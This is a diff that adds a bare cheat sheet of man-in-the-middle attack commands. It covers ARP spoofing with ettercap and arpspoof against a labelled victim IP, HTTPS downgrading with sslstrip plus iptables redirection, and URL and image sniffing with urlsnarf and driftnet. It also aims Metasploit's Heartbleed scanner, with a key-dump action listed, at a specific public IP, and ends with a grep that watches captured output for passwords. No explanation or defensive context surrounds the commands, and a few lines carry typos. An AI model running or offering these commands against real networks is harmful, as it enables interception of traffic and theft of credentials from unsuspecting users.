@@ -1,0 +1,106 @@
+Setup IP forwarding check port forward (should return 1)
+========================================================
+echo 1 > /proc/sys/net/ipv4/ip_forward
+cat /proc/sys/net/ipv4/ip_forward
+
+set iptables and port redirection
+=====================
+iptables -t nat -L
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+iptables-save
+
+route -n
+route -nNvee
+route -nv
+route -FC
+route -V
+
+netstat -n
+netstat -r
+
+[disabled = 0,enabled = 1]
+
+Detecting WAF using NMAP
+
+nmap -sP <IPrange>
+
+nmap -sS -o <host>
+
+
+
+Fingerprinting WAF using NMAP
+=============================
+nmap -p80 --script http-waf-detect <host>
+nmap -p80 --script http-waf-fingerprint <host>
+
+Fingerprinting WAF using WAFw00f
+================================
+wafw00f.py <url>
+
+Start SSLstrip
+==============
+sslstrip -a -f -l 8080 -w ssl
+sslstrip -l 8080
+sslstrip -l 1000
+sslstrip -k -l 10000
+
+echo -n | openssl s_client -connect HOST:PORTNUMBER | sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p' > /tmp/$SERVERNAME.cert
+-showcerts
+echo -n
+sed -ne '/-BEGIN CERTIFICATE-/,/-END CERTIFICATE-/p'
+openssl s_client -connect {HOSTNAME}:{PORT} -showcerts
+openssl s_client -showcerts -connect server.edu:443 </dev/null 2>/dev/null|openssl x509 -outform PEM >mycertfile.pem
+openssl s_client -connect {HOSTNAME}:{PORT} | tee logfile
+openssl x509 -inform PEM -in certfile -text -out certdata
+
+Open the sslstrip.log
+=====================
+cat sslstrip.log
+
+start Ettercap
+==============
+ettercap -Tqi wlan0 -M ARP:REMOTE /gateway//
+ettercap -T -q -i wlan0 -M arp /iptarget//
+gedit /etc/ettercap/etter.conf
+("ip tables" remove "#" ,add interface, add ports destination 80 , to 10000)
+
+navigate to ecuid , change the value 65534 to 0
+navigate to ecgid , change the value 65534 to 0
+{remove the # from the If you use iptables}
+save
+
+arpspoof -i eth0 -t victimip routerip
+arpspoof -t eth0 -t  192.168.109.18 192.168.109.2
+192.168.109.18 = victim ip
+192.168.109.2 =router ip or gateway
+iptables -t nat -A PREROUTING -p tcp –destination-port 80 -j REDIRECT –to-port 1000
+
+set Urlsnarf
+============
+urlsnarf -i eth0
+
+set driftnet
+============
+driftnet -v -i eth0
+
+msfconsole
+==========
+use auxiliary/scanner/ssl/openssl_heartbleed
+set RHOSTS 103.13.181.18
+set VERBOSE true
+set ACTION SCAN
+
+<action-name>
+SCAN
+DUMP
+KEYS
+Capture
+
+<options>
+run
+rerun
+
+script -f out.txt
+
+watch -n 2 "grep -o -P '.{0,50}pwd.{0,50}' out.txt"
+
